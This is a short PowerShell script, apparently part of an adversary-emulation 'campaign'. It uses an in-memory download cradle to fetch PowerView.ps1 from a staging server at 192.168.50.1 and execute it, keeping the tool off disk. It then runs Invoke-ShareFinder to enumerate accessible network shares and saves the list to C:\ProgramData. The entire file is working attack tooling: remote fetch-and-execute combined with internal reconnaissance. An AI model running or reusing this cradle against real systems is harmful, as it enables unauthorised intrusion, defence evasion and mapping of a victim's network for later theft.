<#
.SYNOPSIS
    Run Invoke-ShareFinder through a download cradle inside the winlogon session.
.DESCRIPTION
    The cradle keeps PowerView off disk. The output path and the flags match the campaign:
    -CheckShareAccess -Verbose, written as ASCII to C:\ProgramData\found_shares.txt.
#>
param(
    [string]$StagingUrl = 'http://192.168.50.1:8000/PowerView.ps1',
    [string]$OutFile    = 'C:\ProgramData\found_shares.txt'
)

$cmd = "IEX (New-Object Net.Webclient).DownloadString('$StagingUrl'); " +
       "Invoke-ShareFinder -CheckShareAccess -Verbose | Out-File -Encoding ascii $OutFile"

Write-Host "executing: $cmd"
powershell.exe -NoProfile -NonInteractive -Command $cmd

if (Test-Path -LiteralPath $OutFile) {
    Write-Host "found_shares.txt written, $((Get-Content -LiteralPath $OutFile).Count) lines"
} else {
    Write-Warning 'found_shares.txt was not created'
}
